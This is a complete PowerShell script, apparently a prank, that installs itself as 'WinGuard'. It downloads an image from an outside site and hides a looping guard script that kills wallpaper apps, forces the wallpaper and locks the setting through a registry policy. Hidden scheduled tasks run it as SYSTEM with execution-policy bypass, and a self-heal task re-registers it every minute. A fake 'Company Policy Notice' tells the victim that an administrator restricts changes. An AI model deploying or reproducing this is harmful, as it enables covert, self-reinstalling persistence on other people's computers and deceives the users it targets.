# ===== CONFIG =====
$wallpaperUrl = "https://groundviews.org/wp-content/uploads/2014/11/20141121-afp-MaithripalaSirisena.jpg"
$base = "$env:ProgramData\WinGuard"
$guard = "$base\guard.ps1"
$heal = "$base\heal.ps1"
$notice = "$base\notice.ps1"
$image = "$base\wallpaper.jpg"
$backup = "$base\backup.txt"
$password = "SorrySahindu"

New-Item $base -ItemType Directory -Force | Out-Null

# ===== BACKUP CURRENT WALLPAPER =====
try {
    (Get-ItemProperty "HKCU:\Control Panel\Desktop").Wallpaper | Out-File $backup -Force
} catch {}

# ===== DOWNLOAD IMAGE =====
Invoke-WebRequest $wallpaperUrl -OutFile $image -UseBasicParsing

# ===== GUARD SCRIPT =====
@"
`$image = '$image'

while (`$true) {

    # Kill wallpaper apps
    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | % {
        Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
    }

    # Apply wallpaper
    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$image
    rundll32.exe user32.dll, UpdatePerUserSystemParameters

    # Lock changes
    New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1

    Start-Sleep 60
}
"@ | Out-File $guard -Encoding UTF8 -Force

# ===== SELF-HEAL SCRIPT =====
@"
if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
    schtasks /create /tn WinGuard /sc onstart /ru SYSTEM /rl highest /tr `"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $guard`"
}
"@ | Out-File $heal -Force

# ===== PRANK NOTICE =====
@"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
"Your wallpaper is managed by company policy.

This device has been pranked by Sahindu 😄

Changes are restricted by the system administrator.",
"Company Policy Notice",
"OK",
"Warning"
)
"@ | Out-File $notice -Force

# ===== CREATE TASKS (SYSTEM LEVEL) =====
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName "WinGuard" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard") `
 -Trigger (New-ScheduledTaskTrigger -AtStartup) `
 -Principal $principal -Force

Register-ScheduledTask -TaskName "WinGuard-Heal" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal") `
 -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) `
 -Principal $principal -Force

Register-ScheduledTask -TaskName "WinGuard-Notice" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -Principal $principal -Force

# ===== START NOW =====
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"

Write-Host "WinGuard installed silently."
